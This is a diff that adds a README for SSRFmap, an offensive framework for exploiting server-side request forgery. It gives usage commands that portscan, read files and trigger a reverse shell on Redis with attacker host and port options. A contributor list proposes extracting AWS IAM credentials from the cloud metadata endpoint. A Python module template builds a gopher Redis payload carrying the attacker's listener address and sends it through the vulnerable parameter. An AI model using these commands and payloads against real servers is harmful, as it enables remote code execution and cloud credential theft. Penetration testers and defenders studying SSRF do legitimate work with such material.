@@ -1,0 +1,88 @@
+# SSRFmap
+
+> Server Side Request Forgery or SSRF is a vulnerability in which an attacker forces a server to perform requests on their behalf. It's often used to leverage actions on other services, this framework aims to find and exploit these services easily. SSRFmap takes a Burp request file as input and a parameter to fuzz.
+
+## Guide / RTFM
+
+```powershell
+usage: ssrfmap.py [-h] [-r REQFILE] [-p PARAM] [-m MODULES] [--lhost LHOST]
+                  [--lport LPORT]
+
+optional arguments:
+  -h, --help     show this help message and exit
+  -r REQFILE     SSRF Request file
+  -p PARAM       SSRF Parameter to target
+  -m MODULES     SSRF Modules to enable
+  -l HANDLER     Start an handler for a reverse shell
+  --lhost LHOST  LHOST reverse shell
+  --lport LPORT  LPORT reverse shell
+```
+
+The default way to use this script is the following.
+
+```powershell
+# Launch a portscan on localhost and read default files
+python ssrfmap.py -r data/request.txt -p url -m readfiles,portscan
+
+# Triggering a reverse shell on a Redis
+python ssrfmap.py -r data/request.txt -p url -m redis --lhost=127.0.0.1 --lport=4242 -l 4242
+
+# -l create a listener for reverse shell on the specified port
+# --lhost and --lport work like in Metasploit, these values are used to create a reverse shell payload
+```
+
+## Contribute
+
+I <3 pull requests :)
+Feel free to add any feature listed below or a new service.
+
+- --level arg - ability to tweak payloads in order to bypass some IDS/WAF. E.g: `127.0.0.1 -> [::] -> 0000: -> ...`
+- networkscan - same a portscan, we want to discover machines in the same network
+- aws and other cloud providers - extract sensitive data from http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy and more
+
+The following code is a template if you wish to add a module interacting with a service.
+
+```python
+from core.utils import *
+import logging
+
+name        = "servicename in lowercase"
+description = "ServiceName RCE - What does it d"
+author      = "Name or pseudo of the author"
+
+class exploit():
+
+    def __init__(self, requester, args):
+        logging.info("Module '{}' launched !".format(name))
+
+        # Data for the service
+        ip   = "127.0.0.1"
+        port = "6379"
+        data = "*1%0d%0a$8%0d%0af[...]save%0d%0aquit%0d%0a"
+        payload = wrapper_gopher(data, ip , port)
+
+        # Handle args for reverse shell
+        if args.lhost == None: payload = payload.replace("SERVER_HOST", input("Server Host:"))
+        else:                  payload = payload.replace("SERVER_HOST", args.lhost)
+
+        if args.lport == None: payload = payload.replace("SERVER_PORT", input("Server Port:"))
+        else:                  payload = payload.replace("SERVER_PORT", args.lport)
+
+        # Send the payload
+        r = requester.do_request(args.param, payload)
+```
+
+You can also contribute with a beer IRL or with `buymeacoffee.com`
+
+[![Coffee](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://buymeacoff.ee/swissky)
+
+## Thanks to the contributors
+
+- ???
+
+## Inspired by
+
+- [All you need to know about SSRF and how may we write tools to do auto-detect - Auxy](https://medium.com/bugbountywriteup/the-design-and-implementation-of-ssrf-attack-framework-550e9fda16ea)
+- [How I Chained 4 vulnerabilities on GitHub Enterprise, From SSRF Execution Chain to RCE! - Orange Tsai](https://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html)
+- [Blog on Gopherus Tool  -SpyD3r](https://spyclub.tech/2018/blog-on-gopherus/)
+- [Gopherus - Github](https://github.com/tarunkant/Gopherus)
